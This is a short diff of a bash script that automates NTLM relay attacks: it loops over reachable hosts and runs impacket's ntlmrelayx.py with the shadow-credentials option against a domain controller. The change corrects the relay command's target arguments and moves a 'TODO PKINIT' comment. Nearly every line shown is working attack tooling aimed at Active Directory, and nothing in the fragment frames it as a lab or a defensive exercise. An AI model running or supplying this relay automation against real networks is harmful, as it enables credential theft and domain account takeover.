@@ -65,7 +65,7 @@ while read -r target; do
   SHADOW_TARGET=$(echo "$target" | cut -d '.' -f 1)$
 
   echo "[+] Starting relay for target: $target with shadow target: $SHADOW_TARGET... and DC $DC_TARGET"
-  python3 ntlmrelayx.py  "$DC_TARGET" -tf <(echo "$target") --shadow-credentials --shadow-target $SHADOW_TARGET --no-da --no-acl --no-validate-privs &
+  python3 ntlmrelayx.py -t $DC_TARGET --shadow-credentials --shadow-target $SHADOW_TARGET --no-da --no-acl --no-validate-privs &
   RELAY_PID=$!
 
   sleep 5
@@ -81,6 +81,7 @@ echo "[+] Completed relay attack for target: $target"
 
 done < "$REACHABLE_HOSTS"
 
+# TODO PKINIT
+
 echo "[+] All targets processed."
 
-# TODO PKINIT
